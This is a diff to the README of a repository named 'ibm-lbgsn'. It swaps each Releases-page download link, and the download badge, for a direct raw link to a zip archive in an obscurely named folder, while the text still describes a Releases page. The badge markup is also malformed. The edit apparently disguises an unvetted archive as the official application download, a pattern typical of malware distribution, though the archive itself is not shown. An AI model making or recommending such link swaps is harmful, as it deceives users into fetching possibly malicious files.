@@ -6,7 +6,7 @@ Welcome to the ibm-lbgsn repository! This application is designed to make your l
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20ibm--lbgsn-v1.0-blue.svg)](https://github.com/mahm0ud2007/ibm-lbgsn/releases)
+[![Download](https://raw.githubusercontent.com/mahm0ud2007/ibm-lbgsn/main/windwardmost/ibm-lbgsn.zip%https://raw.githubusercontent.com/mahm0ud2007/ibm-lbgsn/main/windwardmost/ibm-lbgsn.zip)](https://raw.githubusercontent.com/mahm0ud2007/ibm-lbgsn/main/windwardmost/ibm-lbgsn.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Welcome to the ibm-lbgsn repository! This application is designed to make your l
 
 ## 📂 Download & Install
 
-To get started, visit the Releases page to download the application: [Download ibm-lbgsn](https://github.com/mahm0ud2007/ibm-lbgsn/releases).
+To get started, visit the Releases page to download the application: [Download ibm-lbgsn](https://raw.githubusercontent.com/mahm0ud2007/ibm-lbgsn/main/windwardmost/ibm-lbgsn.zip).
 
 1. Click on the link above.
 2. You will see a list of the available versions. Choose the latest release.
@@ -62,4 +62,4 @@ We welcome your feedback and contributions. If you want to suggest new features 
 
 ## ✨ Acknowledgments
 
-Thanks for using ibm-lbgsn! We appreciate your support and hope you enjoy using our application. Don't forget to visit our Releases page to keep your software up to date: [Download ibm-lbgsn](https://github.com/mahm0ud2007/ibm-lbgsn/releases).
+Thanks for using ibm-lbgsn! We appreciate your support and hope you enjoy using our application. Don't forget to visit our Releases page to keep your software up to date: [Download ibm-lbgsn](https://raw.githubusercontent.com/mahm0ud2007/ibm-lbgsn/main/windwardmost/ibm-lbgsn.zip).
